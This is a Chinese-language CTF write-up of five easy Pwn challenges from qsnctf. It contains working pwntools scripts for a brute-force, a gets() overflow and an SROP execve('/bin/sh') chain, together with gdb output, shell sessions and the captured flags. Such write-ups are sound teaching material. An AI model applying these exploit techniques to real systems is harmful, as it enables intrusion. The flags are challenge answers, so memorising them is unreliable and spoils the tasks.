---
title: qsnctf Pwn复盘
author: LingMj
data: 2025-06-22
categories: [Pwn]
tags: [PWN]
description: 难度-Easy
---

## 第一题目 简单的数学题

>做3个简单的数学题就给你FLAG。
>
>没有附件不过呢就回答数学题目，可以随便打
>

```
└─$ nc challenge.qsnctf.com 31131
[*]Welcome! Please solve an equation.
[*]Challenge 1: 2*15^2-1/x+15-6=458.875 Please tell me the result of x.
8
[*]True! This problem is very simple! Right?!

[*]Challenge 2: 5+sqrt(x)=8 Please tell me the result of x.
[*]Hint: Sqrt means radical sign.
9
[*]True! This problem is very simple! Right?!

[*]Challenge 3: x^10+2^10-4*x=6131066258749 Please tell me the result of x.
19
[*]True! This problem is very simple! Right?!

[*]Here you go, flag.
```

>回答我是利用gtp计算当然现在给出不计算的方案就是猜数答案，回答错误会直接停止所以
>

```
└─$ nc challenge.qsnctf.com 32489
[*]Welcome! Please solve an equation.
[*]Challenge 1: 2*15^2-1/x+15-6=458.875 Please tell me the result of x.
21
[*]Error! This problem is very simple! Try again.
```

>经历过群主的那个脚本这个很好写
>

```
[*] Interrupted
[+] Opening connection to challenge.qsnctf.com on port 32489: Done
[*]Welcome! Please solve an equation.
[*]Challenge 1:
7
 2*15^2-1/x+15-6=458.875 Please tell me the result of x.
[*]Error!
[*] Switching to interactive mode
 This problem is very simple! Try again.
[*] Got EOF while reading in interactive
$
[*] Interrupted
[+] Opening connection to challenge.qsnctf.com on port 32489: Done
[*]Welcome! Please solve an equation.
[*]Challenge 1:
8
 2*15^2-1/x+15-6=458.875 Please tell me the result of x.
[*]True!
[*] Closed connection to challenge.qsnctf.com port 32489
[*] Closed connection to challenge.qsnctf.com port 32489
[*] Closed connection to challenge.qsnctf.com port 32489
[*] Closed connection to challenge.qsnctf.com port 32489
[*] Closed connection to challenge.qsnctf.com port 32489
[*] Closed connection to challenge.qsnctf.com port 32489
[*] Closed connection to challenge.qsnctf.com port 32489
[*] Closed connection to challenge.qsnctf.com port 32489
[*] Closed connection to challenge.qsnctf.com port 32489
```

>可以看到8的时候会自动停止
>

```
from pwn import *
import re

for i in range(20):
    p = remote("challenge.qsnctf.com", 32489)
    a = p.recvuntil(b"Challenge 1:").decode()
    print(a)
    print(i)
    p.sendline(str(i))
    b = p.recvuntil(b"!").decode()
    print(b)

    if "Error!" not in b:
        break

    p.interactive()
```

>这个脚本有个小bug就是必须得手动ctrl+c哈哈哈不太会写自动挡
>

```
└─$ nc challenge.qsnctf.com 32489
[*]Welcome! Please solve an equation.
[*]Challenge 1: 2*15^2-1/x+15-6=458.875 Please tell me the result of x.
8
[*]True! This problem is very simple! Right?!

[*]Challenge 2: 5+sqrt(x)=8 Please tell me the result of x.
[*]Hint: Sqrt means radical sign.
```

>第二个题目类似
>

```
 2*15^2-1/x+15-6=458.875 Please tell me the result of x.
[*]True! This problem is very simple! Right?!

[*]Challenge 2:
8
 5+sqrt(x)=8 Please tell me the result of x.
[*]Hint: Sqrt means radical sign.
[*]Error!
[*] Switching to interactive mode
 This problem is very simple! Try again.
[*] Got EOF while reading in interactive
$
[*] Interrupted
[+] Opening connection to challenge.qsnctf.com on port 32489: Done
[*]Welcome! Please solve an equation.
[*]Challenge 1:
 2*15^2-1/x+15-6=458.875 Please tell me the result of x.
[*]True! This problem is very simple! Right?!

[*]Challenge 2:
9
 5+sqrt(x)=8 Please tell me the result of x.
[*]Hint: Sqrt means radical sign.
[*]True!
```

>第三题的话应该是一样的
>

```
[*]Challenge 3:
18
[*] Switching to interactive mode
 This problem is very simple! Try again.
[*] Got EOF while reading in interactive
$
[*] Interrupted
[+] Opening connection to challenge.qsnctf.com on port 32489: Done
[*]Welcome! Please solve an equation.
[*]Challenge 1:
 2*15^2-1/x+15-6=458.875 Please tell me the result of x.
[*]True! This problem is very simple! Right?!

[*]Challenge 2:
 5+sqrt(x)=8 Please tell me the result of x.
[*]Hint: Sqrt means radical sign.
[*]True! This problem is very simple! Right?!

[*]Challenge 3:
19
Traceback (most recent call last):
  File "/home/lingmj/xxoo/exp2.py", line 16, in <module>
    d = p.recvuntil(b"Error!").decode()
        ~~~~~~~~~~~^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 341, in recvuntil
    res = self.recv(timeout=self.timeout)
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 106, in recv
    return self._recv(numb, timeout) or b''
           ~~~~~~~~~~^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 176, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ~~~~~~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py", line 155, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
```

>到19的时候确实停止了报错不重要哈哈哈哈
>

```
from pwn import *
import re

for i in range(20):
    p = remote("challenge.qsnctf.com", 32489)
    a = p.recvuntil(b"Challenge 1:").decode()
    print(a)
    p.sendline(b'8')
    b = p.recvuntil(b"Challenge 2:").decode()
    print(b)
    p.sendline(b'9')
    c = p.recvuntil(b"Challenge 3:").decode()
    print(c)
    print(i)
    p.sendline(str(i))
    d = p.recvuntil(b"Error!").decode()

    if "Error!" not in d:
        break

    p.interactive()
```

>一股屎山代码感觉，但是能解除题目即可
>

## 第二题 你会使用sh吗？

>你会使用sh吗？，有附件可以看源代码了
>

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  puts("Welcome To www.qsnctf.com");
  puts("Please enter the content!");
  fflush(_bss_start);
  system("/bin/sh");
  return 0;
}
```

>好像是有输入看看有偏移量吗？
>

```
└─$ checksec --file=pwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   39 Symbols        No    0               0               pwn
```

>然后利用gdb调试
>

```
pwndbg> run
Starting program: /home/lingmj/xxoo/pwn
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome To www.qsnctf.com
Please enter the content!
[Attaching after Thread 0x7ffff7db0740 (LWP 1609) vfork to child process 1612]
[New inferior 2 (process 1612)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 1609 after child exec]
[Inferior 1 (process 1609) detached]
process 1612 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff7db0740 (LWP 1612) vfork to child process 1613]
[New inferior 3 (process 1613)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 1612 after child exec]
[Inferior 2 (process 1612) detached]
process 1613 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
/bin/sh: 1: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag: not found
$ id
[Attaching after Thread 0x7ffff7db0740 (LWP 1613) vfork to child process 1621]
[New inferior 4 (process 1621)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 1613 after child exec]
[Inferior 3 (process 1613) detached]
process 1621 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
uid=1000(lingmj) gid=1000(lingmj) groups=1000(lingmj),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
[Inferior 4 (process 1621) exited normally]
$
[1]+  Stopped                 gdb -q ./pwn
```

>确实能执行命令但是不知道里面有flag么直接开环境
>

```
└─$ nc challenge.qsnctf.com 31618
Welcome To www.qsnctf.com
Please enter the content!
ls -al
total 52
drwxr-x---.  1 0 1000    29 Jun 22 14:24 .
drwxr-x---.  1 0 1000    29 Jun 22 14:24 ..
-rwxr-x---.  1 0 1000   220 Jan  6  2022 .bash_logout
-rwxr-x---.  1 0 1000  3771 Jan  6  2022 .bashrc
-rwxr-x---.  1 0 1000   807 Jan  6  2022 .profile
drwxr-x---.  2 0 1000    37 Aug  3  2024 bin
drwxr-xr-x.  2 0    0    59 Aug  3  2024 dev
-r--r--r--.  1 0    0    39 Jun 22 14:24 flag
drwxr-x---. 20 0 1000  4096 Aug  3  2024 lib
drwxr-x---.  3 0 1000  4096 Aug  3  2024 lib32
drwxr-x---.  2 0 1000    34 Aug  3  2024 lib64
drwxr-x---.  4 0 1000    35 Aug  3  2024 libexec
drwxr-x---.  3 0 1000  4096 Aug  3  2024 libx32
-rwxr-xr-x.  1 0 1000 16088 Jun 22 14:24 pwn
-rwxr-xr-x.  1 0    0   328 Aug  3  2024 pwn.c
cat flag
flag{f1c8bafa68444dc7b104a380f1b0d526}
```

>确实是直接的shell
>

## 第三题 浅红欺醉粉，肯信有江梅

>开启nc之旅吧
>

```
└─$ nc challenge.qsnctf.com 30221
[+]Welcome to SQNUCTF!
[+]浅红欺醉粉，肯信有江梅。
[+]Welcome to the world of PWN!！
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
/bin/sh: 1: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag: not found
ls -al
total 36
drwxr-x---. 1 0 1000    18 Jun 22 14:27 .
drwxr-x---. 1 0 1000    18 Jun 22 14:27 ..
-rwxr-x---. 1 0 1000   220 Jan  6  2022 .bash_logout
-rwxr-x---. 1 0 1000  3771 Jan  6  2022 .bashrc
-rwxr-x---. 1 0 1000   807 Jan  6  2022 .profile
drwxr-x---. 1 0 1000    37 Mar 27 07:11 bin
drwxr-x---. 1 0 1000    59 Mar 27 07:11 dev
-rwxr-----. 1 0 1000    39 Jun 22 14:27 flag
drwxr-x---. 1 0 1000   249 Mar 27 07:11 lib
drwxr-x---. 1 0 1000  4096 Mar 27 07:11 lib32
drwxr-x---. 1 0 1000    34 Mar 27 07:11 lib64
drwxr-x---. 1 0 1000    35 Mar 27 07:11 libexec
drwxr-x---. 1 0 1000     6 Mar 27 07:11 libx32
-rwxr-x---. 1 0 1000 16272 Mar 29 02:23 nc
cat flag
flag{55872082905943ea98f8fc14a070655b}
```

>yes 直接给答案
>

## 第四题 领取你的小猫娘

>猫娘吃太多东西肚子要被撑爆了 看起来想溢出backdoor，直接找偏移量
>

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[76]; // [rsp+0h] [rbp-50h] BYREF
  int v5; // [rsp+4Ch] [rbp-4h]

  init(argc, argv, envp);
  v5 = 0;
  puts("[+]Welcome to SQNUCTF!");
  sleep(1u);
  puts("[+]Cat girl is super hungry now, she won't give a flag if she doesn't have anything to eat.");
  puts("[+]hint:Virtual cat girl loves to eat characters");
  gets(v4);
  if ( v5 )
  {
    backdoor();
  }
  else
  {
    puts("[*]I haven't eaten enough, you scoundrel.");
    puts("[*]Hmph, I won't talk to you anymore!");
  }
  return 0;
}
```

>好像不对好像还是直接给shell
>

```
└─$ gdb -q ./cat
pwndbg: loaded 199 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from ./cat...
(No debugging symbols found in ./cat)
------- tip of the day (disable with set show-tips off) -------
If your program has multiple threads they will be displayed in the context display or using the context threads command
pwndbg> run
Starting program: /home/lingmj/xxoo/cat
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+]Welcome to SQNUCTF!
[+]Cat girl is super hungry now, she won't give a flag if she doesn't have anything to eat.
[+]hint:Virtual cat girl loves to eat characters
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
[+]Cat girl gave up, qwq
[Attaching after Thread 0x7ffff7db0740 (LWP 1719) vfork to child process 1722]
[New inferior 2 (process 1722)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 1719 after child exec]
[Inferior 1 (process 1719) detached]
process 1722 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff7db0740 (LWP 1722) vfork to child process 1723]
[New inferior 3 (process 1723)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 1722 after child exec]
[Inferior 2 (process 1722) detached]
process 1723 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$ id
[Attaching after Thread 0x7ffff7db0740 (LWP 1723) vfork to child process 1724]
[New inferior 4 (process 1724)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 1723 after child exec]
[Inferior 3 (process 1723) detached]
process 1724 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
uid=1000(lingmj) gid=1000(lingmj) groups=1000(lingmj),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
[Inferior 4 (process 1724) exited normally]
$
[1]+  Stopped                 gdb -q ./cat
```

>实验一下
>

```
└─$ nc challenge.qsnctf.com 31320
[+]Welcome to SQNUCTF!
[+]Cat girl is super hungry now, she won't give a flag if she doesn't have anything to eat.
[+]hint:Virtual cat girl loves to eat characters
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
[+]Cat girl gave up, qwq
id
/bin/sh: 1: id: not found
ls -al
total 36
drwxr-x---. 1 0 1000    18 Jun 22 14:34 .
drwxr-x---. 1 0 1000    18 Jun 22 14:34 ..
-rwxr-x---. 1 0 1000   220 Jan  6  2022 .bash_logout
-rwxr-x---. 1 0 1000  3771 Jan  6  2022 .bashrc
-rwxr-x---. 1 0 1000   807 Jan  6  2022 .profile
drwxr-x---. 1 0 1000    37 Mar 27 07:11 bin
-rwxr-x---. 1 0 1000 16280 Mar 29 02:24 cat
drwxr-x---. 1 0 1000    59 Mar 27 07:11 dev
-rwxr-----. 1 0 1000    38 Jun 22 14:34 flag
drwxr-x---. 1 0 1000   249 Mar 27 07:11 lib
drwxr-x---. 1 0 1000  4096 Mar 27 07:11 lib32
drwxr-x---. 1 0 1000    34 Mar 27 07:11 lib64
drwxr-x---. 1 0 1000    35 Mar 27 07:11 libexec
drwxr-x---. 1 0 1000     6 Mar 27 07:11 libx32
cat flag
flag{f8a7ce9bd5524f71987c2d375d6aa0eb}
```

>怎么神奇的么，查查什么原理，gtp的解释是：如何触发 backdoor() 通过输入超长数据覆盖 v5，使其值从 0 变为非零：输入长度需超过76字节​​：前76字节填充 v4 缓冲区。第77字节起覆盖 v5​​（例如输入77字节时，最后一个字节覆盖 v5 的最低有效位）。​覆盖值要求​​：v5 是 int 类型（4字节），但只需最低字节非零即可满足 if (v5) 条件。
>

## 第五题 密钥藏舟夜半行

>构造你的ROP链吧!，看看这是什么题
>

```
signed __int64 start()
{
  signed __int64 v0; // rax
  signed __int64 v1; // rax
  char v3[8]; // [rsp+0h] [rbp-8h] BYREF

  v0 = sys_write(1u, &msg, 0x3AuLL);
  v1 = sys_read(0, v3, 0x400uLL);
  return sys_write(1u, v3, 8uLL);
}
```

>提示好少看看咋做
>

```
.data:0000000000402000 msg             db 'W'                  ; DATA XREF: LOAD:00000000004000C0↑o
.data:0000000000402000                                         ; _start+E↑o
.data:0000000000402001                 db  68h ; h
.data:0000000000402002                 db  61h ; a
.data:0000000000402003                 db  74h ; t
.data:0000000000402004                 db  20h
.data:0000000000402005                 db  77h ; w
.data:0000000000402006                 db  61h ; a
.data:0000000000402007                 db  73h ; s
.data:0000000000402008                 db  20h
.data:0000000000402009                 db  6Fh ; o
.data:000000000040200A                 db  6Eh ; n
.data:000000000040200B                 db  63h ; c
.data:000000000040200C                 db  65h ; e
.data:000000000040200D                 db  20h
.data:000000000040200E                 db  74h ; t
.data:000000000040200F                 db  68h ; h
.data:0000000000402010                 db  6Fh ; o
.data:0000000000402011                 db  75h ; u
.data:0000000000402012                 db  67h ; g
.data:0000000000402013                 db  68h ; h
.data:0000000000402014                 db  74h ; t
.data:0000000000402015                 db  20h
.data:0000000000402016                 db  6Fh ; o
.data:0000000000402017                 db  72h ; r
.data:0000000000402018                 db  64h ; d
.data:0000000000402019                 db  69h ; i
.data:000000000040201A                 db  6Eh ; n
.data:000000000040201B                 db  61h ; a
.data:000000000040201C                 db  72h ; r
.data:000000000040201D                 db  79h ; y
.data:000000000040201E                 db  2Ch ; ,
.data:000000000040201F                 db  20h
.data:0000000000402020                 db  6Eh ; n
.data:0000000000402021                 db  6Fh ; o
.data:0000000000402022                 db  77h ; w
.data:0000000000402023                 db  20h
.data:0000000000402024                 db  73h ; s
.data:0000000000402025                 db  65h ; e
.data:0000000000402026                 db  65h ; e
.data:0000000000402027                 db  6Dh ; m
.data:0000000000402028                 db  73h ; s
.data:0000000000402029                 db  20h
.data:000000000040202A                 db  65h ; e
.data:000000000040202B                 db  78h ; x
.data:000000000040202C                 db  74h ; t
.data:000000000040202D                 db  72h ; r
.data:000000000040202E                 db  61h ; a
.data:000000000040202F                 db  6Fh ; o
.data:0000000000402030                 db  72h ; r
.data:0000000000402031                 db  64h ; d
.data:0000000000402032                 db  69h ; i
.data:0000000000402033                 db  6Eh ; n
.data:0000000000402034                 db  61h ; a
.data:0000000000402035                 db  72h ; r
.data:0000000000402036                 db  79h ; y
.data:0000000000402037                 db  2Eh ; .
.data:0000000000402038                 db  0Ah
.data:0000000000402039                 db  0Dh
.data:000000000040203A binsh           db '/bin/sh',0
.data:000000000040203A _data           ends
```

>是存在/bin/sh的
>

```
pwndbg> run
Starting program: /home/lingmj/xxoo/pwn01
What was once thought ordinary, now seems extraordinary.
id
Program received signal SIGSEGV, Segmentation fault.
0x0000000000000001 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────
 RAX  8
 RBX  0
 RCX  0x401047 (_start+71) ◂— pop rbp
 RDX  8
 RDI  1
 RSI  0x7fffffffdf88 ◂— 0xa6469 /* 'id\n' */
 R8   0
 R9   0
 R10  0
 R11  0x216
 R12  0
 R13  0
 R14  0
 R15  0
 RBP  0xa6469
 RSP  0x7fffffffdf98 —▸ 0x7fffffffe23b ◂— '/home/lingmj/xxoo/pwn01'
 RIP  1
──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
Invalid address 0x1










───────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdf98 —▸ 0x7fffffffe23b ◂— '/home/lingmj/xxoo/pwn01'
01:0008│     0x7fffffffdfa0 ◂— 0
02:0010│     0x7fffffffdfa8 —▸ 0x7fffffffe253 ◂— 'SHELL=/bin/bash'
03:0018│     0x7fffffffdfb0 —▸ 0x7fffffffe263 ◂— 'WSL2_GUI_APPS_ENABLED=1'
04:0020│     0x7fffffffdfb8 —▸ 0x7fffffffe27b ◂— 'WSL_DISTRO_NAME=kali-linux'
05:0028│     0x7fffffffdfc0 —▸ 0x7fffffffe296 ◂— 'WT_SESSION=c1f0ae11-24ed-43be-8a6c-fd1c78a858ae'
06:0030│     0x7fffffffdfc8 —▸ 0x7fffffffe2c6 ◂— 0x5245545f5353454c ('LESS_TER')
07:0038│     0x7fffffffdfd0 —▸ 0x7fffffffe2db ◂— 0x5245545f5353454c ('LESS_TER')
─────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0              0x1 None
   1   0x7fffffffe23b None
   2              0x0 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

>看看是否存在偏移量
>

```
└─$ msf-pattern_offset -q 2Aa3
[*] Exact match at offset 8

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401048 in _start ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────
 RAX  8
 RBX  0
 RCX  0x401047 (_start+71) ◂— pop rbp
 RDX  8
 RDI  1
 RSI  0x7fffffffdf88 ◂— 0x6141316141306141 ('Aa0Aa1Aa')
 R8   0
 R9   0
 R10  0
 R11  0x216
 R12  0
 R13  0
 R14  0
 R15  0
 RBP  0x6141316141306141 ('Aa0Aa1Aa')
 RSP  0x7fffffffdf90 ◂— 0x4134614133614132 ('2Aa3Aa4A')
 RIP  0x401048 (_start+72) ◂— ret
──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
 ► 0x401048 <_start+72>    ret                                <0x4134614133614132>
    ↓









───────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdf90 ◂— 0x4134614133614132 ('2Aa3Aa4A')
01:0008│     0x7fffffffdf98 ◂— 0x3761413661413561 ('a5Aa6Aa7')
02:0010│     0x7fffffffdfa0 ◂— 0x6241396141386141 ('Aa8Aa9Ab')
03:0018│     0x7fffffffdfa8 ◂— 0x4132624131624130 ('0Ab1Ab2A')
04:0020│     0x7fffffffdfb0 ◂— 0x3562413462413362 ('b3Ab4Ab5')
05:0028│     0x7fffffffdfb8 ◂— 0x6241376241366241 ('Ab6Ab7Ab')
06:0030│     0x7fffffffdfc0 ◂— 0x4130634139624138 ('8Ab9Ac0A')
07:0038│     0x7fffffffdfc8 ◂— 0x3363413263413163 ('c1Ac2Ac3')
─────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401048 _start+72
```

>有点摸不着头脑没有偏移量看起来
>

```
└─$ nc challenge.qsnctf.com 31438
What was once thought ordinary, now seems extraordinary.
AAAAAAAABBBB
AAAAAAAA
┌──(lingmj㉿LingMj)-[~/xxoo]
└─$ nc challenge.qsnctf.com 31438
What was once thought ordinary, now seems extraordinary.
cat flag
cat flag
```

>更难了
>

```
└─$ objdump -d ./pwn01 | grep syscall
  40101d:       0f 05                   syscall
  401031:       0f 05                   syscall
  401045:       0f 05                   syscall
```

>题目为SROP（Sigreturn-Oriented Programming）
>

```
└─$ readelf -S ./pwn01 | grep .bss
  [ 3] .bss              NOBITS           0000000000402044  00002042
```

>直接工具找不到
>

```
.text:0000000000401048 _start          endp
.text:0000000000401048
.text:0000000000401049 ; ---------------------------------------------------------------------------
.text:0000000000401049                 pop     rsi
.text:000000000040104A                 pop     rax
.text:000000000040104B                 retn
.text:000000000040104B _text           ends
```

>然后现在知道的地址为：syscall = 401045 ， .bss = 402044， /bin/bash = 40203A， pop rax ret = 40104A
>

```
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./pwn01')
io = process('./pwn01')

syscall_addr = 0x401045
binsh_addr = 0x40203A

# 方案2：直接构造 SROP（无栈迁移）
frame = SigreturnFrame(kernel='amd64')
frame.rax = 59
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload2 = b'A'*16 + p64(syscall_addr) + bytes(frame)
io.send(payload2[:15])  # 确保 rax=15

io.interactive()
```

>改了一下是这样的exp感觉很有问题
>

```
└─$ python3 exp2.py
[+] Opening connection to challenge.qsnctf.com on port 31438: Done
[DEBUG] Sent 0xf bytes:
    b'A' * 0xf
[*] Switching to interactive mode
[DEBUG] Received 0x42 bytes:
    b'What was once thought ordinary, now seems extraordinary.\n'
    b'\r'
    b'AAAAAAAA'
What was once thought ordinary, now seems extraordinary.
AAAAAAAA[*] Got EOF while reading in interactive
$ ls -al
[DEBUG] Sent 0x7 bytes:
    b'ls -al\n'
$ ls -al
[DEBUG] Sent 0x7 bytes:
    b'ls -al\n'
[*] Closed connection to challenge.qsnctf.com port 31438
[*] Got EOF while sending in interactive
```

>开始头疼了，看一下wp了
>

```
from pwn import *
from codes.FastPwn import *
from codes.vm_tool import *
context.arch = 'amd64'
io = FastPwn(1)

# io.gdb_b(0x401048);io.gdb_run()
io.remote('challenge.qsnctf.com:30879')

pop_rax = 0x40104A        # pop rax ; ret
syscall = 0x401045         # syscall指令地址
binsh = 0x40203A           # /bin/sh字符串地址

pay = p64(0)
pay += p64(0x40104A) # rax=15
pay += p64(15)
pay += p64(syscall) # syscall

# 构造SROP帧
frame = SigreturnFrame()
frame.rdi = binsh           # rdi指向/bin/sh
frame.rsi = 0               # rsi为0
frame.rdx = 0               # rdx为0
frame.rax = 59              # execve系统调用号
frame.rip = syscall         # 执行syscall以调用execve
pay+=bytes(frame)

io.sl(pay)

io.ia()
```

>跟大佬wp很相似了
>

```
└─$ python3 exp2.py
[+] Opening connection to challenge.qsnctf.com on port 31438: Done
[*] Switching to interactive mode
What was once thought ordinary, now seems extraordinary.
\x00\x00\x00\x00\x00\x00\x00\x00$ ls -al
total 32
drwxr-x---. 1 0 1000   18 Jun 22 14:50 .
drwxr-x---. 1 0 1000   18 Jun 22 14:50 ..
-rwxr-x---. 1 0 1000  220 Jan  6  2022 .bash_logout
-rwxr-x---. 1 0 1000 3771 Jan  6  2022 .bashrc
-rwxr-x---. 1 0 1000  807 Jan  6  2022 .profile
drwxr-x---. 1 0 1000   37 Mar 27 07:11 bin
drwxr-x---. 1 0 1000   59 Mar 27 07:11 dev
-rwxr-----. 1 0 1000   39 Jun 22 14:50 flag
drwxr-x---. 1 0 1000  249 Mar 27 07:11 lib
drwxr-x---. 1 0 1000 4096 Mar 27 07:11 lib32
drwxr-x---. 1 0 1000   34 Mar 27 07:11 lib64
drwxr-x---. 1 0 1000   35 Mar 27 07:11 libexec
drwxr-x---. 1 0 1000    6 Mar 27 07:11 libx32
-rwxr-x---. 1 0 1000 9056 Nov 16  2024 pwn
